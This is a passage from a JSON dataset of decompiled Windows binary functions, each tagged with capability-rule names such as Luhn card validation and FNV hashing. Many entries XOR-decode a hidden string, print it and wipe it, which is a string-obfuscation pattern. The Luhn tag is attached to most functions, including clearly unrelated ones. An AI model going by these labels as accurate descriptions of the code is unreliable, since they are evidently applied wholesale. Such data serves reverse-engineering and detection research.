fcn.1400123f0(uStack32, arg2_00, arg2);\n    fcn.140014600(arg2_00);\n    return;\n}\n",
        "token_count": 631
    },
    "14001698": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140016980(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    \n    puVar4 = arg1 + 0x18;\n    puVar1 = puVar4 + *(arg1 + 0x14);\n    iVar5 = 0;\n    while( true ) {\n        if (puVar1 <= puVar4) {\n            return iVar5;\n        }\n        if (*puVar4 != 0) break;\n        puVar4 = puVar4 + 1;\n        iVar5 = iVar5 + 0x20;\n    }\n    if (puVar1 <= puVar4) {\n        return iVar5;\n    }\n    iVar3 = 0;\n    for (uVar2 = *puVar4; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n        iVar3 = iVar3 + 1;\n    }\n    return iVar5 + iVar3;\n}\n",
        "token_count": 249
    },
    "1400169c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400169c0(void)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    char *pcVar3;\n    \n    pcVar3 = \"0123456789\";\n    uVar2 = 0x30;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x1401291c0) = cVar1 + 'p';\n        uVar2 = *pcVar3;\n    } while (*pcVar3 != 0);\n    pcVar3 = \"abcdef\";\n    uVar2 = 0x61;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x1401291c0) = cVar1 + 'o';\n        uVar2 = *pcVar3;\n    } while (*pcVar3 != 0);\n    pcVar3 = \"ABCDEF\";\n    uVar2 = 0x41;\n    do {\n        cVar1 = pcVar3;\n        pcVar3 = pcVar3 + 1;\n        *(uVar2 + 0x1401291c0) = cVar1 + 'h';\n        uVar2 = *pcVar3;\n    } while (*pcVar3 != 0);\n    return;\n}\n",
        "token_count": 301
    },
    "1400170e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400170e0(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint uVar4;\n    uint64_t uVar5;\n    \n    iVar1 = *(arg1 + 0x14);\n    uVar5 = arg3;\n    iVar3 = 0;\n    do {\n        uVar2 = *(arg1 + 0x18 + iVar3 * 4) * arg2 + uVar5;\n        *(arg1 + 0x18 + iVar3 * 4) = uVar2;\n        iVar3 = iVar3 + 1;\n        uVar5 = uVar2 >> 0x20;\n    } while (iVar3 < iVar1);\n    iVar3 = arg1;\n    if (uVar5 != 0) {\n        uVar4 = uVar2 >> 0x20;\n        if (*(arg1 + 0xc) == iVar1 || *(arg1 + 0xc) < iVar1) {\n            iVar3 = fcn.140016f80(*(arg1 + 8) + 1);\n            if (iVar3 != 0) {\n                sub.msvcrt.dll_memcpy(iVar3 + 0x10, arg1 + 0x10, *(arg1 + 0x14) * 4 + 8);\n                fcn.140017070(arg1);\n                *(iVar3 + 0x18 + iVar1 * 4) = uVar4;\n                *(iVar3 + 0x14) = iVar1 + 1;\n            }\n        }\n        else {\n            *(arg1 + 0x18 + iVar1 * 4) = uVar4;\n            *(arg1 + 0x14) = iVar1 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 412
    },
    "140017c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140017c50(char **arg1, char *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    pcVar3 = *arg1;\n    do {\n        cVar1 = *arg2;\n        arg2 = arg2 + 1;\n        pcVar3 = pcVar3 + 1;\n        if (cVar1 == 0) {\n            *arg1 = pcVar3;\n            return 1;\n        }\n        iVar2 = *pcVar3;\n        if (iVar2 - 0x41U < 0x1a) {\n            iVar2 = iVar2 + 0x20;\n        }\n    } while (iVar2 == cVar1);\n    return 0;\n}\n",
        "token_count": 170
    },
    "140017fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140017fc0(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll___iob_func();\n    return iVar1 + (arg1 & 0xffffffff) * 0x30;\n}\n",
        "token_count": 60
    },
    "140017fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140017fe0(uchar *arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    uint *puVar2;\n    uint16_t auStackX16 [12];\n    int32_t aiStack12 [3];\n    \n    auStackX16[0] = noname_1;\n    if (arg3 == 0) {\n        if (0xff < noname_1) {\ncode_r0x000140018054:\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x2a;\n            return 0xffffffff;\n        }\n        *arg1 = noname_1;\n        uVar1 = 1;\n    }\n    else {\n        aiStack12[0] = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(arg3, 0, auStackX16, 1, arg1, arg4, 0, aiStack12);\n        if ((uVar1 == 0) || (aiStack12[0] != 0)) goto code_r0x000140018054;\n    }\n    return uVar1;\n}\n",
        "token_count": 265
    },
    "14001831": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140018310(ushort *arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg4_00;\n    ushort uStack42;\n    \n    uStack42 = 0;\n    if (arg1 == NULL) {\n        arg1 = &uStack42;\n    }\n    sub.msvcrt.dll____mb_cur_max_func();\n    sub.msvcrt.dll____lc_codepage_func();\n    arg4_00 = 0x140129cc8;\n    if (arg4 != 0) {\n        arg4_00 = arg4;\n    }\n    iVar1 = fcn.1400181b0(arg1, arg2, arg3, arg4_00);\n    return iVar1;\n}\n",
        "token_count": 173
    },
    "1400188d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1400188d0(int64_t arg1)\n\n{\n    int64_t in_RDX;\n    uint64_t in_R8;\n    ulong in_R9;\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x15) != '\\0') {\n        for (iStack68 = 0; in_RDX = arg1,  iStack68 < 0x16; iStack68 = iStack68 + 1) {\n            in_R8 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, in_RDX, in_R8, in_R9);\n    fcn.140001530(0x1400fd3c0, in_RDX, in_R8, in_R9);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x16; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 358
    },
    "1400189b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1400189b0(int64_t arg1)\n\n{\n    int64_t in_RDX;\n    uint64_t in_R8;\n    ulong in_R9;\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x19) != '\\0') {\n        for (iStack68 = 0; in_RDX = arg1,  iStack68 < 0x1a; iStack68 = iStack68 + 1) {\n            in_R8 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, in_RDX, in_R8, in_R9);\n    fcn.140001530(0x1400fd3c0, in_RDX, in_R8, in_R9);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x1a; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 360
    },
    "140018a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140018a90(int64_t arg1)\n\n{\n    int64_t in_RDX;\n    uint64_t in_R8;\n    ulong in_R9;\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x1f) != '\\0') {\n        for (iStack68 = 0; in_RDX = arg1,  iStack68 < 0x20; iStack68 = iStack68 + 1) {\n            in_R8 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, in_RDX, in_R8, in_R9);\n    fcn.140001530(0x1400fd3c0, in_RDX, in_R8, in_R9);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x20; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 358
    },
    "140018b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140018b70(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x2d) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x2e; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x2e; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 377
    },
    "140018c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140018c60(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x30) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x31; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x1400fd3c0, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x31; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 343
    },
    "140018d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140018d40(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x32) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x33; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x33; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 374
    },
    "140018e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140018e30(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x36) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x37; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x1400fd3c0, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x37; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 343
    },
    "140018f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140018f10(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x38) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x39; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x39; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 374
    },
    "14001900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140019000(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x3c) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x3d; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x1400fd3c0, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x3d; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 345
    },
    "1400190e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1400190e0(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x48) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x49; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x1400fd3c0, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x49; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 344
    },
    "1400191c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1400191c0(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x49) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x4a; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x4a; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 377
    },
    "1400192b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1400192b0(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x4b) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x4c; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x1400fd3c0, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x4c; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 347
    },
    "14001939": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140019390(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x4b) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x4c; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x35U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x4c; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "14001a0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14001a0a0(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x1400f9860 == '\\0') {\n        iVar1 = fcn.1400b69d0(0x1400f9860);\n        if (iVar1 != 0) {\n            if (**0x140102a70 != 0) {\n                fcn.14000ea00(0x1400fc320);\n            }\n            fcn.1400014f0(0x1400b6d70);\n            fcn.1400b6ad0(0x1400f9860);\n            return 0x1400fc320;\n        }\n    }\n    return 0x1400fc320;\n}\n",
        "token_count": 164
    },
    "14001a1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t ** fcn.14001a1b0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t **in_RAX;\n    int64_t **ppiVar2;\n    int64_t **ppiVar3;\n    int64_t *piVar4;\n    uint32_t uVar5;\n    int64_t **ppiVar6;\n    int64_t **ppiVar7;\n    uint64_t **ppuVar8;\n    int32_t *piVar9;\n    uint64_t *puVar10;\n    uint64_t uVar11;\n    int64_t **ppiVar12;\n    \n    iVar1 = **0x140102a70;\n    piVar9 = *0x140102a70;\n    if (iVar1 != 0) goto code_r0x00014001a278;\n    piVar9 = *(arg1 + -0x10);\n    if (*0x1400f9b70 == NULL) {\n        *(arg1 + -8) = 0;\n        *0x1400f9b70 = arg1 + -0x10;\n        return in_RAX;\n    }\n    do {\n        ppiVar3 = arg1 + -0x10;\n        ppiVar6 = ppiVar3 + piVar9;\n        if (ppiVar6 < *0x1400f9b70) goto code_r0x00014001a2a3;\n        in_RAX = (*0x1400f9b70)[1];\n        if (ppiVar6 == *0x1400f9b70) {\n            piVar9 = piVar9 + **0x1400f9b70;\n            *(arg1 + -8) = in_RAX;\n            *(arg1 + -0x10) = piVar9;\n            *0x1400f9b70 = ppiVar3;\n        }\n        else {\n            ppiVar12 = 0x1400f9b70;\n            ppiVar7 = *0x1400f9b70;\n            if (in_RAX != NULL) {\n                do {\n                    ppiVar2 = in_RAX;\n                    if (ppiVar2 <= ppiVar6) {\n                        if (ppiVar6 == ppiVar2) {\n                            piVar9 = piVar9 + *ppiVar6;\n                            ppiVar7[1] = ppiVar6[1];\n                        }\n                        break;\n                    }\n                    ppiVar12 = ppiVar7 + 1;\n                    in_RAX = ppiVar2[1];\n                    ppiVar7 = ppiVar2;\n                } while (ppiVar2[1] != NULL);\n                ppiVar7 = *ppiVar12;\n            }\n            if (ppiVar3 == ppiVar7 + *ppiVar7) {\n                in_RAX = *ppiVar7 + piVar9;\n                *ppiVar7 = in_RAX;\n            }\n            else {\n                piVar4 = ppiVar7[1];\n                *(arg1 + -0x10) = piVar9;\n                *(arg1 + -8) = piVar4;\n                in_RAX = *ppiVar12;\n                in_RAX[1] = ppiVar3;\n            }\n        }\n        while( true ) {\n            if ((iVar1 == 0) || (in_RAX = fcn.14000eab0(0x1400f9b60),  in_RAX == 0)) {\n                return in_RAX;\n            }\n            fcn.14001bf30();\ncode_r0x00014001a278:\n            ppiVar6 = 0x1400f9b60;\n            in_RAX = fcn.14000ea40(0x1400f9b60);\n            if (in_RAX != 0) {\n                fcn.14001bf00();\n                piVar9 = *0x140102a70;\n                iVar1 = **0x140102a70;\n                if (iVar1 != 0) goto code_r0x00014001a3d0;\n                ppiVar3 = ppiVar6 + 2;\n                if (ppiVar3 < 0x10) {\n                    ppiVar3 = 0x10;\n                }\n                if (*0x1400f9b70 == NULL) {\n                    return NULL;\n                }\n                goto code_r0x00014001a34e;\n            }\n            iVar1 = *piVar9;\n            piVar9 = *(arg1 + -0x10);\n            if (*0x1400f9b70 != NULL) break;\ncode_r0x00014001a2a3:\n            *(arg1 + -8) = *0x1400f9b70;\n            *0x1400f9b70 = arg1 + -0x10;\n        }\n    } while( true );\ncode_r0x00014001a34e:\n    piVar4 = ppiVar3 + 0xfU & 0xfffffffffffffff0;\n    ppuVar8 = 0x1400f9b70;\n    ppiVar6 = *0x1400f9b70;\n    do {\n        if (piVar4 <= *ppiVar6) {\n            uVar11 = *ppiVar6 - piVar4;\n            if (uVar11 < 0x10) {\n                *ppiVar6 = *ppiVar6;\n                puVar10 = ppiVar6[1];\n            }\n            else {\n                puVar10 = ppiVar6 + piVar4;\n                puVar10[1] = ppiVar6[1];\n                ppiVar6 = *ppuVar8;\n                *puVar10 = uVar11;\n                *ppiVar6 = piVar4;\n            }\n            *ppuVar8 = puVar10;\n            ppiVar6 = ppiVar6 + 2;\n            break;\n        }\n        ppuVar8 = ppiVar6 + 1;\n        ppiVar6 = ppiVar6[1];\n    } while (ppiVar6 != NULL);\n    do {\n        if ((iVar1 == 0) || (iVar1 = fcn.14000eab0(0x1400f9b60),  iVar1 == 0)) {\n            return ppiVar6;\n        }\n        fcn.14001bf30();\ncode_r0x00014001a3d0:\n        uVar5 = 0x400f9b60;\n        iVar1 = fcn.14000ea40(0x1400f9b60);\n        if (iVar1 != 0) {\n            fcn.14001bf00();\n            switch(uVar5 & 0x7d) {\n            default:\n                return NULL;\n            case 1:\n            case 0x11:\n                return 0x140100c18;\n            case 5:\n            case 0x15:\n                return 0x140100c39;\n            case 8:\n                return 0x140100c1e;\n            case 9:\n            case 0x19:\n                return 0x140100c2a;\n            case 0xc:\n                return 0x140100c15;\n            case 0xd:\n            case 0x1d:\n                return 0x140100c1a;\n            case 0x10:\n            case 0x30:\n                return 0x140100c10;\n            case 0x14:\n            case 0x34:\n                return 0x140100c32;\n            case 0x18:\n                return 0x140100c20;\n            case 0x1c:\n                return 0x140100c3c;\n            case 0x38:\n                return 0x140100c23;\n            case 0x3c:\n                return 0x140100c40;\n            case 0x50:\n            case 0x70:\n                return 0x140100c12;\n            case 0x54:\n                return 0x140100c35;\n            case 0x78:\n                return 0x140100c26;\n            case 0x7c:\n                return \"w+bx\";\n            }\n        }\n        ppiVar3 = ppiVar6 + 2;\n        iVar1 = *piVar9;\n        if (ppiVar3 < 0x10) {\n            ppiVar3 = 0x10;\n        }\n        ppiVar6 = *0x1400f9b70;\n    } while (*0x1400f9b70 == NULL);\n    goto code_r0x00014001a34e;\n}\n",
        "token_count": 1888
    },
    "14001a42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
